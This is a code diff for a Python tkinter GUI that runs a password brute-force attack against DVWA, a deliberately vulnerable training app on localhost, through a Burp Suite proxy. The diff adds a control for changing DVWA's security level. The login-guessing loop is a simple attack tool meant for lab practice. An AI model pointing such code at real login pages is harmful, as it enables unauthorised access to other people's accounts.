@@ -2,8 +2,32 @@ import requests
 import tkinter as tk
 
 # DVWA base URL (adjust as needed)
-DVWA_URL = "http://localhost/DVWA/login.php"
+DVWA_LOGIN_URL = "http://localhost/dvwa/login.php"
+DVWA_SECURITY_URL = "http://localhost/dvwa/security.php"
 PROXY_URL = "http://127.0.0.1:8080"  # Burp Suite proxy address
+
+# Function to change security level
+def change_security_level(security_level):
+    # Configure proxy settings for Burp Suite
+    proxies = {
+        'http': PROXY_URL,
+        'https': PROXY_URL
+    }
+
+    # Prepare data for the security level change request
+    data = {
+        'security': security_level,
+        'seclev_submit': 'Submit'
+    }
+
+    # Send the request to change the security level through Burp Suite proxy
+    response = requests.post(DVWA_SECURITY_URL, data=data, proxies=proxies)
+
+    # Check if the security level change was successful
+    if f"Security level is now {security_level.upper()}" in response.text:
+        result_label.config(text=f"Security level changed to {security_level.upper()}")
+    else:
+        result_label.config(text="Failed to change security level")
 
 # Function to perform brute force attack
 def perform_brute_force(username, password_list):
@@ -23,7 +47,7 @@ def perform_brute_force(username, password_list):
         }
 
         # Send the login request to DVWA through Burp Suite proxy
-        response = requests.post(DVWA_URL, data=data, proxies=proxies)
+        response = requests.post(DVWA_LOGIN_URL, data=data, proxies=proxies)
 
         # Check if the login was successful
         if "Welcome to the password protected area" in response.text:
@@ -50,13 +74,27 @@ password_label.grid(row=1, column=0, padx=10, pady=10)
 password_entry = tk.Entry(root)
 password_entry.grid(row=1, column=1, padx=10, pady=10)
 
+# Security level selection
+security_label = tk.Label(root, text="Security Level:")
+security_label.grid(row=2, column=0, padx=10, pady=10)
+
+security_var = tk.StringVar(root)
+security_var.set("low")  # Default selection
+
+security_option = tk.OptionMenu(root, security_var, "low", "medium", "high")
+security_option.grid(row=2, column=1, padx=10, pady=10)
+
+# Button to change security level
+change_security_button = tk.Button(root, text="Change Security Level", command=lambda: change_security_level(security_var.get()))
+change_security_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)
+
 # Button to trigger attack
 attack_button = tk.Button(root, text="Perform Brute Force Attack", command=lambda: perform_brute_force(username_entry.get(), password_entry.get().split(",")))
-attack_button.grid(row=2, column=0, columnspan=2, padx=10, pady=10)
+attack_button.grid(row=4, column=0, columnspan=2, padx=10, pady=10)
 
 # Label to display attack result
 result_label = tk.Label(root, text="")
-result_label.grid(row=3, column=0, columnspan=2, padx=10, pady=10)
+result_label.grid(row=5, column=0, columnspan=2, padx=10, pady=10)
 
 # Start the TKinter event loop
 root.mainloop()
